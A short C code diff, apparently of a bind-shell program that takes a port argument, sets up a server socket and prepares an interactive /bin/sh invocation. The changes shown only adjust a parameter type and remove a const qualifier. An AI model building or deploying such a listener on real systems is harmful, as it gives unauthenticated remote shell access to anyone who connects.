@@ -14,7 +14,7 @@ void error(char * msg)
 }
 
 int
-init_serv(struct sockaddr_in * name, unsigned short int port)
+init_serv(struct sockaddr_in * name, unsigned int port)
 {
   int fd;
   //memset ((char *) name,0, sizeof (*name));
@@ -35,7 +35,7 @@ int
 main (int argc, char ** argv) 
 {
   int sockfd, port, conex; 
-  char * const sh[] = { "/bin/sh", "-i", NULL };
+  char * sh[] = { "/bin/sh", "-i", NULL };
   struct sockaddr_in server;
   if (argc < 2) {
     printf("%s port\n",argv[0]);
